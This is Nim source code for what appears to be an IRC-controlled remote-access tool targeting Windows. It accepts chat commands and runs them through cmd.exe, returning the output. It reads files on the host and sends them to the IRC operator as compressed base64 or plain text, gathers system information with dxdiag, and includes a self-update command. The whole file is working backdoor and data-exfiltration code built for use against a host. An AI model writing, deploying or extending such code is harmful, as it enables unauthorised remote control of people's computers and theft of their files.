import irc, strutils, osproc, os, zippy, base64, math, update_handler

let
    g_dbg* = true
    g_msg_length = 400
    g_msg_send_time = 2 #seconds
    g_msg_max_transfer_time = 20



type
    ExecRespose = tuple
        exitCode:int
        output:string



proc helper_secondsToMinutesAndSeconds(seconds: int): string =
    let minutes = seconds div 60
    let remainingSeconds = seconds mod 60
    return $minutes & "min " & $remainingSeconds & "sec"



## Recombine trailing tokens
## Required if the parameter is just one long string that included spaces
proc helper_recombine(tokens:seq[string], start = 1):string =
    var first = true
    for i in start..<len(tokens):
        if first:
            result &= tokens[i]
            first = false
        else:
            result &= " " & tokens[i]



## Slice a long message into an array of strings that fit the message length limit
proc helper_chopString(victim:string):seq[string] =
    var i:int
    while i < len(victim):
        if i+g_msg_length < len(victim):
            result.add(victim[i..i+g_msg_length])
        else:
            result.add(victim[i..high(victim)])
            break
        i+=g_msg_length+1



## Check to see if a message will take a long time to display be sent
## User will be informed of duration and what to do if it breaches the max transfer time
proc helper_checkSendDuration(event: IrcEvent, client:Irc, msg:string): bool =
    var
        transfer_linecount:int = 0
        transfer_duration:int
        transfer_durStr:string
        transfer_lines:seq[string]

    for line in msg.splitLines():
        transfer_lines.add(line)
        transfer_linecount += int(math.floor(len(line) / g_msg_length)) + 1
    
    transfer_duration = transfer_linecount * g_msg_send_time
    transfer_durStr = helper_secondsToMinutesAndSeconds(transfer_duration)


    client.privmsg(event.origin, "DATA incoming, no. of messages: " & $transfer_linecount & ", ~duration: " & transfer_durStr)

    if (transfer_duration > g_msg_max_transfer_time):
        client.privmsg(event.origin, "WARNING: the transfer will take more than " & $g_msg_max_transfer_time & "s. you need to force this command using '!' as the last token")
        return false
    else:
        return true



proc rexec_runCommand(cmd:string):ExecRespose =
    var 
        output:string
        exitcode:int    
    (output, exitcode) = execCmdEx("cmd.exe /c " & cmd, options = {poUsePath})
    result.output = output
    result.exitCode = exitcode



## Because just using cd with execCmdEx doesnt do anything
proc rexec_changeDir(path:string):bool =
    if os.dirExists(path):
        os.setCurrentDir(path)
        return true
    else:
        return false



## Downloads the specified file, compresses it as .gz and sends it encoded as base64
## A very slow file transfer, maybe implement DCC somehow??
proc cmd_get(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) = 
    var filename = helper_recombine(tokens,1)

    if fileExists(filename):
        if g_dbg: echo "Opening file"
        var file = open(filename)
        var filestr = file.readAll()

        var cfile = compress(filestr)
        var b64_cfile = encode(cfile)
        
        if(not helper_checkSendDuration(event, client, b64_cfile) and not force):
            return

        var i = 0

        while i < len(b64_cfile):
            if i+g_msg_length < len(b64_cfile):
                client.privmsg(event.origin, b64_cfile[i..i+g_msg_length])
            else:
                client.privmsg(event.origin, b64_cfile[i..high(b64_cfile)])
                break
            i+=g_msg_length+1
        close(file)

        client.privmsg(event.origin, "DATA transfer complete")
    else:
        if g_dbg: echo "File missing"
        client.privmsg(event.origin, "that did not work out")



## Similar to cmd_get, but sends the file's contents as plain text
proc cmd_print(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) = 
    var filename = helper_recombine(tokens,1)

    if fileExists(filename):
        var file = open(filename)
        var filestr = file.readAll()
            
        if(not helper_checkSendDuration(event, client, fileStr) and not force):
            return

        for line in filestr.splitLines():
            if strip(line) == "": continue
            if len(line) > g_msg_length:
                var line_copped = helper_chopString(line)
                for morsel in line_copped:
                    client.privmsg(event.origin, morsel)
            else:
                client.privmsg(event.origin, line)

        close(file)

        client.privmsg(event.origin, "DATA transfer complete")
    else:
        if g_dbg: echo "File missing"
        client.privmsg(event.origin, "that did not work out")



## Runs dxdiag and sends the output text file using cmd_get
proc cmd_dxdiag(event:IrcEvent, client:Irc) =
    client.privmsg(event.origin,"one moment")
    if g_dbg: echo "Starting dxdiag"
    var 
        cmd:string = "cmd.exe /c dxdiag /dontskip /t dxdiag_file.txt"
        outputx:string
        exitcodex:int
    (outputx,exitcodex) = execCmdEx(cmd, options = {poUsePath})

    if g_dbg: echo "Checking file"
    cmd_get(event, client, @["dxdiag_file.txt"], true)
    removeFile("dxdiag_file.txt")

    if g_dbg: echo "Dxdiag command done"



## Processes !rexec
## Contains some shortcuts for certain functions, everything else just gets sent to rexec_runCommand
proc cmd_rexec(event:IrcEvent, client:Irc, tokens:seq[string]) =
    if len(tokens) < 2:
        client.privmsg(event.origin, "too short")
        return

    var
        response:ExecRespose
        caught:bool = false

    case tokens[1]:
    of "cd":
        if len(tokens) == 2:
            response = rexec_runCommand("echo %CD%")
            caught = true
        else:
            var path = helper_recombine(tokens,2)
            if rexec_changeDir(path):
                caught = true
                client.privmsg(event.origin, "cwd: " & path)
            else:
                client.privmsg(event.origin, "cwd: no such directory")
    of "cd..":
        response = rexec_runCommand("cd ..")
        caught = true
    of "ls":
        response = rexec_runCommand("dir /w")
        caught = true
    else:
        var args:string
        args = helper_recombine(tokens)
        
        if g_dbg: echo "ARGS: " & args

        response = rexec_runCommand(args)

        if response.exitCode != 0:
            client.privmsg(event.origin, "Error [ "  & $response.exitCode & " ]")
        else:
            caught = true

    if caught:
        for line in response.output.splitLines():
            client.privmsg(event.origin, line)



## Checks if a private message was a command and calls appropriate functions
proc cmdh_handle*(event:IrcEvent, client:Irc) =
    var
        msg = event.params[event.params.high]
        tokens:seq[string]

    if g_dbg: echo "MSG: ", msg

    for token in msg.tokenize():
        if not token.isSep:
            tokens.add(token.token)

    case tokens[0]:
    of "!hey": client.privmsg(event.origin, "heyyy v" & $current_version)
    of "!lag":  client.privmsg(event.origin, formatFloat(client.getLag))
    of "!excessFlood":
        for i in 0..10:
            client.privmsg(event.origin, "TEST" & $i)
    of "!dxdiag":
        cmd_dxdiag(event, client)
    of "!r": #remote execution
        cmd_rexec(event, client, tokens)
    of "!get":
        if tokens[high(tokens)] == "!":
            var ftokens = tokens
            ftokens.delete(high(tokens))
            cmd_get(event, client, ftokens, true)
        else:
            cmd_get(event, client, tokens, false)
    of "!print":
        if tokens[high(tokens)] == "!":
            var ftokens = tokens
            ftokens.delete(high(tokens))
            cmd_print(event, client, ftokens, true)
        else:
            cmd_print(event, client, tokens, false)
    of "!update":
        discard updt_check(true , client, event)
            
        